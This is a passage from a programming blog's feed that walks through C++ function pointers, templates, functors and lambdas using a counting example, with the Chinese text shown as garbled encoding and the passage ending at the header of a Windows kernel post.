class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="comment">//ç»Ÿè®¡å¤§äº20çš„æ•°å­—</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¾ˆè‡ªç„¶çš„ç»™å‡ºè§£æ³•</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(<span class="type">int</span>* start, <span class="type">int</span>* end)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*start &gt; <span class="number">20</span>)</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="comment">//ç»Ÿè®¡å¤§äº20çš„æ•°å­—</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>(IntArray,IntArray+<span class="number">20</span>)&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å‡½æ•°æŒ‡é’ˆ"><a class="markdownIt-Anchor" href="#å‡½æ•°æŒ‡é’ˆ"></a> å‡½æ•°æŒ‡é’ˆ</h1><p>è¿™ä¸ªæ—¶å€™çš„éœ€è¦æ»¡è¶³ <strong>ç»Ÿè®¡å¤§äº10çš„æ•°å­—</strong> æˆ–è€… <strong>ç»Ÿè®¡å°äº35çš„æ•°å­—</strong>ï¼Œé‚£ä¹ˆå¯ä»¥å°†<code>*start &gt; 20</code>è¿™ä¸€æ®µåŒ…è£…ä¸€ä¸‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(<span class="type">int</span>* start, <span class="type">int</span>* end, <span class="type">bool</span>(*ConditionFunc)(<span class="type">const</span> <span class="type">int</span> &amp;))</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ConditionFunc</span>(*start))</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bGreat20</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123; <span class="keyword">return</span> num &gt; <span class="number">20</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bGreat10</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123; <span class="keyword">return</span> num &gt; <span class="number">10</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bLess35</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123;  <span class="keyword">return</span> num &lt; <span class="number">35</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="comment">//ç»Ÿè®¡å¤§äº20çš„æ•°å­—</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bGreat20 )&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 10 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bGreat10 )&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bLess35 )&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å›¾ç‰‡ä¸Šçš„ä»£ç æœ‰ç‚¹å°é—®é¢˜</p><p><img src="https://img.joe1sn.top/uploads/medium/6bd00d07f13d059ff7e733e80ecc0017.png" alt="image-20230626083232291" /></p><p>åœ¨cè¯­è¨€ä¸­å¯ä»¥è¿™æ ·å†™ï¼Œè™½ç„¶ç¼–è¯‘ä¼šæœ‰è­¦å‘Šï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥ç”Ÿæˆã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">CountMatch</span><span class="params">(<span class="type">int</span>* start, <span class="type">int</span>* end, <span class="type">void</span> *function_pointer(<span class="type">int</span>))</span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (function_pointer(*start))</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Pointer</span><span class="params">(<span class="type">int</span> start)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Happy\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="comment">//ç»Ÿè®¡å¤§äº20çš„æ•°å­—</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Matches: %d\n&quot;</span>,CountMatch(IntArray,IntArray+<span class="number">20</span>, Pointer));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨c<ins>ä¸­ä¼´éšç€æŒ‡é’ˆçš„å¼•ç”¨<code>*p</code>å’Œè§£å¼•ç”¨<code>&amp;p</code>ï¼ŒC</ins>å¯¹æŒ‡é’ˆçš„ç±»å‹å®‰å…¨æ€§è¿›è¡Œäº†æ›´ä¸¥æ ¼çš„é™åˆ¶ã€‚C++ä¸­çš„æŒ‡é’ˆç±»å‹å¿…é¡»ä¸æ‰€æŒ‡å‘çš„å¯¹è±¡ç±»å‹åŒ¹é…ï¼Œä¸å…è®¸è¿›è¡Œéšå¼ç±»å‹è½¬æ¢ã€‚è¿™å¯ä»¥å¸®åŠ©å‡å°‘æ½œåœ¨çš„ç±»å‹é”™è¯¯å’Œç¼–ç¨‹é”™è¯¯ã€‚</p><h1 id="å‡½æ•°æ¨¡æ¿"><a class="markdownIt-Anchor" href="#å‡½æ•°æ¨¡æ¿"></a> å‡½æ•°æ¨¡æ¿</h1><p>ä¸Šé¢çš„å‡½æ•°åªèƒ½æ”¯æŒ<code>int</code>ï¼Œä½¿ç”¨å‡½æ•°æ¨¡æ¿èƒ½è®©ä»–æ”¯æŒæ›´å¤šç±»å‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(T* start, T* end, <span class="type">bool</span>(*ConditionFunc)(<span class="type">const</span> T &amp;))</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ConditionFunc</span>(*start))</span><br><span class="line">                sum++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bGreat20</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123; <span class="keyword">return</span> num &gt; <span class="number">20</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bGreat10</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123; <span class="keyword">return</span> num &gt; <span class="number">10</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bLess35</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123;  <span class="keyword">return</span> num &lt; <span class="number">35</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bTiny</span><span class="params">(<span class="type">const</span> std::string &amp;val)</span></span>&#123; <span class="keyword">return</span> val.<span class="built_in">size</span>() &lt;= <span class="number">3</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    std::string StrArray[] = &#123;<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>,<span class="string">&quot;This&quot;</span>,<span class="string">&quot;is&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;test&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">//ç»Ÿè®¡å¤§äº20çš„æ•°å­—</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bGreat20 )&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 10 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bGreat10 )&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( StrArray, StrArray+<span class="number">6</span>, bTiny )&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ä»¿å‡½æ•°"><a class="markdownIt-Anchor" href="#ä»¿å‡½æ•°"></a> ä»¿å‡½æ•°</h1><p>åœ¨æ¡ä»¶ä¸­å¦‚æœéœ€è¦å¤„ç†ç”¨æˆ·ä¼ å…¥çš„æ•°å­—æ€ä¹ˆåŠ</p><p>ä»¿å‡½æ•°ï¼ˆFunctorï¼‰æ˜¯C++ä¸­çš„ä¸€ä¸ªæ¦‚å¿µï¼ŒæŒ‡çš„æ˜¯å¯ä»¥åƒå‡½æ•°ä¸€æ ·ä½¿ç”¨çš„å¯¹è±¡ã€‚å®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªç±»æˆ–ç»“æ„ä½“ï¼Œé‡è½½äº†å‡½æ•°è°ƒç”¨è¿ç®—ç¬¦ <code>operator()</code>ï¼Œä½¿å¾—å¯¹è±¡å¯ä»¥åƒå‡½æ•°ä¸€æ ·è¿›è¡Œè°ƒç”¨æ“ä½œã€‚</p><p>chatGPTç»™äº†æˆ‘è¿™æ ·ä¸€ä¸ªä¾‹å­</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªä»¿å‡½æ•°ç±»</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddFunctor</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªä»¿å‡½æ•°å¯¹è±¡</span></span><br><span class="line">    AddFunctor add;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ä»¿å‡½æ•°å¯¹è±¡è¿›è¡Œè°ƒç”¨</span></span><br><span class="line">    <span class="type">int</span> result = <span class="built_in">add</span>(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡ºç»“æœ</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Result: &quot;</span> &lt;&lt; result &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œå¯ä»¥è¿™æ ·å†™</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Greater</span></span><br><span class="line">&#123;</span><br><span class="line">    T mVal; <span class="comment">//æŒæœ‰çš„çŠ¶æ€</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Greater</span><span class="params">(T value)</span>:</span></span><br><span class="line"><span class="function">        mVal(value)&#123;</span>&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> T &amp;val)</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> val&gt;mVal; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>explicit</code>ï¼šé€šè¿‡åœ¨å•å‚æ•°æ„é€ å‡½æ•°å‰æ·»åŠ  <code>explicit</code> å…³é”®å­—ï¼Œå¯ä»¥é˜²æ­¢ç¼–è¯‘å™¨åœ¨éœ€è¦è¿›è¡Œç±»å‹è½¬æ¢çš„æƒ…å†µä¸‹è‡ªåŠ¨è°ƒç”¨è¯¥æ„é€ å‡½æ•°ã€‚</li><li><code>operator</code>ï¼šä»¿å‡½æ•°çš„å®ç°ï¼Œä½¿å¾—å¯¹è±¡å¯ä»¥åƒå‡½æ•°ä¸€æ ·è¿›è¡Œè°ƒç”¨æ“ä½œã€‚</li></ul><p>æŠ“å‡½æ•°ä¸­ç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼ˆè¯¥æ ‡å‡†ä»…åœ¨c++11åŠä»¥ä¸Šæ”¯æŒï¼‰ï¼Œä½†æ˜¯è¿™æ ·å‡½æ•°æŒ‡é’ˆå°±æ²¡æ³•ç”¨äº†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Greater&lt;<span class="type">int</span>&gt; greater20&#123;<span class="number">20</span>&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å­¦ä¹ æ ‡å‡†åº“ä¸­çš„æ“ä½œå°†æ¨¡æ¿æŒç»­ä¸‹å»</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> fCompare&gt;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(T* start, T* end, fCompare ConditionFunc)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ConditionFunc</span>(*start))</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åç¨‹åº</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> fCompare&gt;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(T* start, T* end, fCompare ConditionFunc)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ConditionFunc</span>(*start))</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Greater</span></span><br><span class="line">&#123;</span><br><span class="line">    T mVal; <span class="comment">//æŒæœ‰çš„çŠ¶æ€</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Greater</span><span class="params">(T value)</span>:</span></span><br><span class="line"><span class="function">        mVal(value)&#123;</span>&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> T &amp;val)</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> val&gt;mVal; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    std::string StrArray[] = &#123;<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>,<span class="string">&quot;This&quot;</span>,<span class="string">&quot;is&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;test&quot;</span>&#125;;</span><br><span class="line">    Greater&lt;<span class="type">int</span>&gt; greater20&#123;<span class="number">20</span>&#125;;</span><br><span class="line">    <span class="comment">//ç»Ÿè®¡å¤§äº20çš„æ•°å­—</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, greater20 )&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="lambdaè¡¨è¾¾å¼"><a class="markdownIt-Anchor" href="#lambdaè¡¨è¾¾å¼"></a> lambdaè¡¨è¾¾å¼</h1><p>è¿™ä¸ªæˆ‘å†Qtä¸Šç”¨çš„æŒºå¤šçš„ï¼Œä»–æ˜¯åŒ¿åå‡½æ•°çš„å®ç°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="keyword">auto</span> greater20 = [](<span class="keyword">auto</span> &amp;val) -&gt; <span class="type">bool</span> &#123; <span class="keyword">return</span> val &gt; <span class="number">20</span>; &#125;;</span><br><span class="line">    <span class="comment">//ç»Ÿè®¡å¤§äº20çš„æ•°å­—</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, greater20 )&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;C++çš„å‡½æ•°è¿›åŒ–å°ç»“&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="cpp" scheme="https://joe1sn.eu.org/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>ã€winå†…æ ¸åŸç†ä¸å®ç°ã€‘II. è¿›ç¨‹ä¸çº¿ç¨‹</title>
    <link href="https://joe1sn.eu.org/2023/06/14/windows-kernel-2-process&amp;thread/"/>
    <id>https://joe1sn.eu.org/2023/06/14/windows-kernel-2-process&amp;thread/</id>
    <published>2023-06-14T01:41:52.000Z</published>
    <updated>2023-06-14T03:10:04.422Z</updated>
    
